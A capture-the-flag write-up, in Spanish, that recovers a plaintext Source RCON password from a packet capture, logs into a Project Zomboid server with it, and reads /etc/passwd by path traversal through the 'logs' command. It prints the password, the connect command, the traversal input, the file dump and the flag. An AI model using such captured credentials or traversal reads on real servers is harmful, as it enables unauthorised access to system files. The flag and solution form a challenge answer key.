# [Misc] Deadministration

## Descripción

Un jugador de Project Zomboid habilitó un puerto administrativo para gestionar su servidor remotamente, pero eligió un protocolo inseguro. Nuestro equipo capturó el tráfico de una de sus sesiones. Analiza la captura, accede al servicio y encuentra el secreto oculto en su máquina.

`100.31.120.81:27015`

## Archivos proporcionados

- `ahau.pcapng`

## Análisis

El puerto 27015 es habitual de Source RCON, conocido por no tener ningún tipo de encriptación. Abriendo el archivo pcap en Wireshark y filtrando en el puerto 27015, podemos notar que los payloads si cumplen el formato de un packet de este protocolo:

```
4 bytes     Size        little-endian
4 bytes     Request ID  little-endian
4 bytes     Type        little-endian
N bytes     Body
1 byte      00
1 byte      00
```

En particular, el packet 4 contiene `Type = 03 00 00 00`. El tipo 3 en Source RCON es `SERVERDATA_AUTH` y el body es la contraseña, `jxC91z`.

Analizando los siguientes packets vemos que empiezan a lanzar comandos, como `help`, `players`, `say <message>` y `logs <filename>`. Este último llama la atención, ya que podría permitirnos leer archivos arbitrarios si no está protegido contra path traversal.

## Extracción

Nos conectamos al servidor utilizando `rcon` y la contraseña obtenida:

```bash
rcon -a 100.31.120.81:27015 -p 'jxC91z'
```

Posteriormente, comenzamos a probar path traversal con /etc/passwd. Asumiendo un path como `/var/logs`, intentamos:

```
> logs ../../etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
ctf:x:100:101::/home/ctf:/sbin/nologin
ahau:AHAU{pr070c0l05_1n53gur05_3n_vid30ju3g05}:1001:1001:AHAU CTF:/nonexistent:/sbin/nologin
```

Afortunadamente, en ese mismo archivo se encontraba la flag.

## Flag

`AHAU{pr070c0l05_1n53gur05_3n_vid30ju3g05}`
